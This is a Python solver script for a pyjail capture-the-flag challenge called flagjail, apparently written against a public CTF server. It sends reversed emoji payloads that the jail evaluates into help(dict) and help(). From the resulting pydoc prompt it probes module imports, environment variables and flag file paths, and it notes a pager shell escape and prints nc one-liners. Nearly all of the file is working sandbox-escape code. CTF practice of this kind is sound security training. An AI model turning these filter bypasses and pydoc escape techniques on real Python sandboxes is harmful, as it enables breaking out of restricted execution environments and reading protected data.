#!/usr/bin/env python3
# solve_flagjail_server_fixed.py
#
# Fixed server runner for flagjail.
# Difference from the previous version:
#   - DO NOT shutdown(SHUT_WR) after sending payload.
#   - Keep the socket interactive, because the challenge/pydoc waits for more input.
#
# Usage:
#   python3 solve_flagjail_server_fixed.py challs.pyjail.club 25626 --check
#   python3 solve_flagjail_server_fixed.py challs.pyjail.club 25626 --quick
#   python3 solve_flagjail_server_fixed.py challs.pyjail.club 25626 --request __main__
#   python3 solve_flagjail_server_fixed.py challs.pyjail.club 25626 --request os
#
# Current exploit status:
#   - This verifies the real server primitive.
#   - If remote is non-TTY, help(dict) pager escape is not expected to work.
#   - help() gives an unfiltered pydoc prompt, so this probes pydoc lookups/imports.

from __future__ import annotations

import argparse
import re
import select
import socket
import sys
import time
from typing import Iterable

PAYLOAD_HELP_DICT = ")🇹🇨🇮🇩(🇵🇱🇪🇭"  # -> help(dict)
PAYLOAD_HELP = ")(🇵🇱🇪🇭"            # -> help()

FLAG_RE = re.compile(rb"(?:jail|flag|pyjail|ctf)\{[^}\r\n]{1,200}\}", re.I)

QUICK_REQUESTS = [
    "__main__",
    "sys",
    "os",
    "flags",
    "pip._vendor.certifi.__main__",
    "venv.__main__",
    "idlelib.__main__",
    "tkinter.__main__",
    "unittest.__main__",
]

FULL_REQUESTS = [
    "__main__",
    "sys",
    "os",
    "os.environ",
    "flags",
    "builtins",
    "site",
    "pydoc",
    "linecache",
    "sysconfig",
    "platform",
    "tempfile",
    "glob",
    "fileinput",
    "runpy",
    "code",
    "pdb",
    "/flag-*",
    "../flag-*",
    "/app/run",
    "./run",
    "run",
    "flag",
    "flag.txt",
    "this",
    "antigravity",
    "pip.__main__",
    "pip._vendor.certifi.__main__",
    "pip._vendor.distro.__main__",
    "pip._vendor.platformdirs.__main__",
    "pip._vendor.dependency_groups.__main__",
    "pip._vendor.pygments.__main__",
    "venv.__main__",
    "idlelib.__main__",
    "tkinter.__main__",
    "unittest.__main__",
    "test.__main__",
    "test.autotest",
]


class Conn:
    def __init__(self, host: str, port: int, timeout: float = 12.0):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.s = socket.create_connection((host, port), timeout=timeout)
        self.s.setblocking(False)
        self.buf = b""

    def close(self) -> None:
        try:
            self.s.close()
        except OSError:
            pass

    def sendline(self, text: str) -> None:
        data = (text + "\n").encode("utf-8", "surrogatepass")
        self.s.sendall(data)

    def recv_for(self, seconds: float, echo: bool = False) -> bytes:
        end = time.monotonic() + seconds
        out = []
        while time.monotonic() < end:
            r, _, _ = select.select([self.s], [], [], 0.05)
            if not r:
                continue
            try:
                data = self.s.recv(65536)
            except BlockingIOError:
                continue
            except OSError:
                break
            if not data:
                break
            self.buf += data
            out.append(data)
            if echo:
                sys.stdout.buffer.write(data)
                sys.stdout.buffer.flush()
        return b"".join(out)

    def recv_until(self, needles: Iterable[bytes], total: float = 10.0, idle_after_data: float = 0.7) -> bytes | None:
        needles = list(needles)
        end = time.monotonic() + total
        last_data = None
        while time.monotonic() < end:
            for n in needles:
                if n in self.buf:
                    return n
            r, _, _ = select.select([self.s], [], [], 0.05)
            if r:
                try:
                    data = self.s.recv(65536)
                except BlockingIOError:
                    continue
                except OSError:
                    return None
                if not data:
                    return None
                self.buf += data
                last_data = time.monotonic()
            else:
                if last_data is not None and time.monotonic() - last_data >= idle_after_data:
                    # Useful for plain pydoc output that does not close.
                    return None
        return None


def find_flag(out: bytes) -> str | None:
    m = FLAG_RE.search(out)
    if not m:
        return None
    return m.group(0).decode("utf-8", "replace")


def show(title: str, out: bytes, limit: int = 25000) -> bool:
    print(f"\n===== {title} =====")
    if len(out) > limit:
        shown = out[:limit] + b"\n...[truncated]...\n"
    else:
        shown = out
    print(shown.decode("utf-8", "replace"))
    flag = find_flag(out)
    if flag:
        print("\n[+] FLAG FOUND:", flag)
        return True
    return False


def check_help_dict(host: str, port: int, timeout: float) -> bool:
    c = Conn(host, port, timeout)
    try:
        c.recv_until([b"Your flags please >", b">"], total=4)
        c.sendline(PAYLOAD_HELP_DICT)
        # help(dict) output can be long, but on remote non-TTY it is plain text.
        c.recv_until([b"__hash__ = None", b"NO!", b"Traceback", b"help>"], total=timeout, idle_after_data=1.2)
        c.recv_for(1.0)
        ok = b"Help on class dict" in c.buf or b"class dict(object)" in c.buf
        found = show("help(dict)", c.buf)
        if ok:
            print("[+] eval primitive works: payload became help(dict).")
        else:
            print("[-] did not see expected help(dict) output.")
        if b"--More--" in c.buf:
            print("[+] TTY pager detected; old :! shell escape may work manually.")
        else:
            print("[*] no --More-- pager prompt detected.")
        return found
    finally:
        c.close()


def help_request(host: str, port: int, request: str, timeout: float, print_raw: bool = True) -> tuple[bytes, bool]:
    c = Conn(host, port, timeout)
    try:
        c.recv_until([b"Your flags please >", b">"], total=4)
        c.sendline(PAYLOAD_HELP)
        got = c.recv_until([b"help>"], total=timeout, idle_after_data=1.0)

        if got != b"help>":
            # Grab a little more so we can see what happened.
            c.recv_for(1.0)
            if print_raw:
                show(f"help() failed before request {request!r}", c.buf)
            return c.buf, bool(find_flag(c.buf))

        c.sendline(request)
        # pydoc returns to help> after each normal request. Bad side-effect modules may traceback/close.
        c.recv_until([b"help>", b"Traceback", b"SystemExit", b"ErrorDuringImport"], total=timeout, idle_after_data=1.2)
        c.recv_for(0.5)

        # Try to exit cleanly if still interactive.
        if b"help>" in c.buf[-200:]:
            c.sendline("q")
            c.recv_for(1.0)

        if print_raw:
            found = show(request, c.buf)
        else:
            found = bool(find_flag(c.buf))
        return c.buf, found
    finally:
        c.close()


def run_requests(host: str, port: int, requests: list[str], timeout: float, delay: float) -> bool:
    print(f"[*] running {len(requests)} request(s)")
    print("[*] JAIL_CONNS_PER_IP=2, so delay is intentional.")
    any_found = False
    for i, req in enumerate(requests, 1):
        print(f"\n[*] {i}/{len(requests)} {req!r}")
        try:
            _, found = help_request(host, port, req, timeout)
            if found:
                any_found = True
                break
        except Exception as e:
            print(f"[-] failed: {type(e).__name__}: {e}")
        time.sleep(delay)
    return any_found


def manual_payloads() -> None:
    print("Manual payloads:")
    print("  help(dict):", PAYLOAD_HELP_DICT)
    print("  help():    ", PAYLOAD_HELP)
    print()
    print("Manual nc check:")
    print("  printf '%s\\n' '" + PAYLOAD_HELP_DICT + "' | nc challs.pyjail.club 25626")
    print("  { printf '%s\\n' '" + PAYLOAD_HELP + "'; printf '__main__\\nq\\n'; } | nc challs.pyjail.club 25626")


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("host", nargs="?", default="challs.pyjail.club")
    ap.add_argument("port", nargs="?", type=int, default=25626)
    ap.add_argument("--timeout", type=float, default=12.0)
    ap.add_argument("--delay", type=float, default=1.0)
    ap.add_argument("--check", action="store_true")
    ap.add_argument("--quick", action="store_true")
    ap.add_argument("--full", action="store_true")
    ap.add_argument("--request", action="append", default=[])
    ap.add_argument("--manual", action="store_true")
    args = ap.parse_args()

    if args.manual:
        manual_payloads()
        return 0

    found = False

    if args.check or (not args.quick and not args.full and not args.request):
        found |= check_help_dict(args.host, args.port, args.timeout)
        _, f = help_request(args.host, args.port, "__main__", args.timeout)
        found |= f

    if args.quick:
        found |= run_requests(args.host, args.port, QUICK_REQUESTS, args.timeout, args.delay)

    if args.full:
        found |= run_requests(args.host, args.port, FULL_REQUESTS, args.timeout, args.delay)

    if args.request:
        found |= run_requests(args.host, args.port, args.request, args.timeout, args.delay)

    if found:
        return 0

    print("\n[-] No flag-like token found.")
    print("[*] If help(dict) output appears but no --More-- appears, remote is still non-TTY.")
    print("[*] Then the next step is not waiting more; it is finding a pydoc import side effect.")
    return 2


if __name__ == "__main__":
    raise SystemExit(main())
